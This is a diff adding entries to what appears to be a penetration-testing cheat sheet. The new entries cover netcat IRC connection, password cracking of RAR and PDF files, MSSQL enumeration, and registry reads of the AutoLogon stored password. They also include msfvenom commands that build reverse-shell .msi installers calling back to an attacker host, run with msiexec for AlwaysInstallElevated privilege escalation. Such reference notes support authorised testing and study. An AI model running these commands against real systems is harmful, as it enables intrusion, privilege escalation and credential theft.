@@ -985,6 +985,9 @@ cmdkey /list
 # execute commands
 cmd.exe /c command_here
 
+# run .exe
+start \path\to\exe
+
 # enumerate hidden files
 dir -ah
 dir /ah
@@ -2031,6 +2034,20 @@ sudo iptables -nv -L
 
 
 
+## IRC
+```bash
+# connect to server
+nc -nvvv IP_here port_here
+echo "command_here" | nc -nvvv IP_here port_here
+
+# authenticate to server (all values can be random)
+PASS password_here
+NICK nick_name_here
+USER user_name_here host_name_here server_name_here :real_name_here
+```
+
+
+
 ## JARSIGNER
 ```bash
 # sign apk :
@@ -2069,7 +2086,10 @@ john --show /path/to/hash
 keepass2john db_here.kdbx
 
 # convert password protected rar to john
-rar2john rar_here
+rar2john rar_here.rar >rar_hash
+
+# convert password protected pdf to john
+pdf2john pdf_here.pdf >pdf_hash
 
 # edit rules
 ## open conf file
@@ -2511,9 +2531,29 @@ msf-pattern_offset -l length_here -q EIP_bytes_here
 ```sql
 # connect to a db server as user
 mssql -s IP_db_server -o port -u username -p password
+sqsh -S IP_here -U user_here -P password_here
 
 # check for nse scripts for mssql
 nmap --script-help "*ms* and *sql*"
+
+# check version
+SELECT @@version
+GO # sometimes only "go" works
+
+# current user
+SELECT user_name()
+SELECT system_user
+SELECT user
+SELECT loginame FROM master..sysprocesses WHERE spid=@@SPID
+GO
+
+# current database
+SELECT db_name()
+GO
+
+# list users
+SELECT name FROM master..syslogins
+GO
 
 # error-based SQLi with cast / convert
 ## numeric data
@@ -3058,6 +3098,14 @@ pandoc -s -o out_file_here.pdf markdown_file_here.md
 
 # convert markdown to docx, styled according to reference_document_here
 pandoc markdown_file_here.md -o out_file_here.docx --highlight-style=tango --reference-doc=/path/to/custom_reference_doc_here.docx
+```
+
+
+
+## PDFCRACK
+```bash
+# crack password-protected pdf
+pdfcrack -f /path/to/pdf -w /path/to/wordlist
 ```
 
 
@@ -3888,6 +3936,25 @@ EnableLUA REG_DWORD 0x1
 ConsentPromptBehaviorAdmin REG_DWORD 0x5
 ## 0 = don't prompt, 1 = prompt
 PromptOnSecureDesktop REG_DWORD 0x1
+
+# AlwaysInstallElevated
+## check whether AlwaysInstallElevated is enabled : 0, disabled, 1 = enabled
+reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+## generate malicious .msi
+### x86
+msfvenom -p windows/shell_reverse_tcp LHOST=attacker_IP LPORT=port_here -f msi -a x86 -o shell.msi
+### x64
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=attacker_IP LPORT=port_here -f msi -a x64 -o shell.msi
+## execute .msi
+msiexec /quiet /qn /i C:\path\to\msi
+
+# AutoRuns
+reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+
+# AutoLogon
+reg query HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
+reg query HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon /v DefaultPassword
 ```
 
 
@@ -4528,6 +4595,7 @@ python /path/to/sqlmap -r req.txt --file-read '/path/to/file/here'
 ```bash
 # connect to SQL database
 sqsh -S IP_here -U user_here -P password_here
+sqsh -S IP_here:port_here -U user_here -P password_here
 
 # sqsh - execute command on server
 xp_cmdshell 'command_here'
@@ -4885,6 +4953,9 @@ rlwrap nc -lnvp port_here
 # restart vulnerable service or reboot
 sc stop service_name_here
 shutdown /r /t 0
+shutdown /r /t 0 && exit
+## restart with delay
+shutdown /r /t 10 && exit
 ```
 
 
